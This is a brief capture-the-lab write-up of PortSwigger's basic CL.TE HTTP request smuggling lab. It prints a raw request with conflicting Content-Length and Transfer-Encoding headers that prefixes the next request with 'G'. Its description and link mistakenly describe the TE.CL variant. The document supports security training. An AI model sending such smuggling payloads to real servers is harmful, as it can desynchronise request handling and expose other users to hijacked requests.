# HTTP request smuggling, basic CL.TE vulnerability

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl) involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

## Reproduction and proof of concept

1. Using Burp Repeater, issue the following request twice:

```text
POST / HTTP/1.1
Host: lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The second response should say: ``Unrecognized method GPOST``.

## Exploitability

An attacker will need to smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method `GPOST`.
